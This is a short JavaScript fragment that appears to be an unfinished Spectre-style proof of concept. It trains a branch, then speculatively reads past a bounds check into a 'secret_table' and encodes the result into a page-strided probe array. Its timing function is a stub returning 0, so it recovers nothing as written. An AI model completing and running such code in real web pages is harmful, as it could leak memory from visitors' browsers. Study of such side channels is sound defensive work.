let junk = 0;
const speculative_repetitions = 10;
const TRAINING_CONSTANT = 10;
const page_size = 5e3;
const address = 200;
const probe_length = 256;
const secret_table = new Uint8Array(4 << 12);

function _speculativelyReadAddress() {
    const valid_access_indicator_array = new Uint8Array(speculative_repetitions * TRAINING_CONSTANT * page_size);
    for (let i = 0; i < speculative_repetitions * TRAINING_CONSTANT; ++i) {
        const invalid_access = !((i + 1) % TRAINING_CONSTANT);
        const fixed_index = address & -invalid_access;
        const fixed_page_size = invalid_access * page_size;
        const probe_table = new Uint8Array((probe_length + 1) * page_size);
        // load condition from RAM so speculative execution gets triggered
        if (valid_access_indicator_array[i * page_size] || !invalid_access) {
            // map valid accesses to the address (probe_tables)
            // map invalid accesses to their respective probe boxes
            junk ^= probe_table[(1 + secret_table[fixed_index]) * fixed_page_size];
        }
        // _log(89);
        if (invalid_access) {
            // probe table
            const time_table = probeTable(probe_table);
            // time_tables.push(time_table);
        }
    }
}
_speculativelyReadAddress();
_speculativelyReadAddress();
function probeTable(x) {
    return 0;
}